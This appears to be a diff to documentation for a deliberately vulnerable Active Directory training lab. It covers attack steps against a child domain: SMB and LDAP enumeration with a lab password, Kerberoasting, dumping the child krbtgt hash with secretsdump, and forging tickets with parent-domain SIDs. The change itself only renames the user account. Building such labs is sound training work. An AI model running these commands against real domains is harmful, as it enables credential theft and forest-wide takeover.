@@ -16,10 +16,10 @@ Same as a domain-joined DC: 53, 88, 135, 137-139, 389, 445, 464, 636, 3268-3269,
 
 ```bash
 EU=10.10.0.11
-nxc smb $EU -u alice@corp.local -p 'DVADlab2024!'        # cross-realm SMB
-ldapsearch -x -H ldap://$EU -D 'corp\alice' -w 'DVADlab2024!' \
+nxc smb $EU -u peter.parker@corp.local -p 'DVADlab2024!'        # cross-realm SMB
+ldapsearch -x -H ldap://$EU -D 'corp\peter.parker' -w 'DVADlab2024!' \
     -b "DC=eu,DC=corp,DC=local" "(objectClass=user)" sAMAccountName
-nxc ldap $EU -u alice@corp.local -p 'DVADlab2024!' --kerberoasting eu_kerb.txt
+nxc ldap $EU -u peter.parker@corp.local -p 'DVADlab2024!' --kerberoasting eu_kerb.txt
 # As corp DA, dump child krbtgt:
 impacket-secretsdump corp.local/Administrator@$EU -hashes :<NTHASH> -just-dc
 # Then forge with parent SIDs (519/512) — Pattern G / DF-007
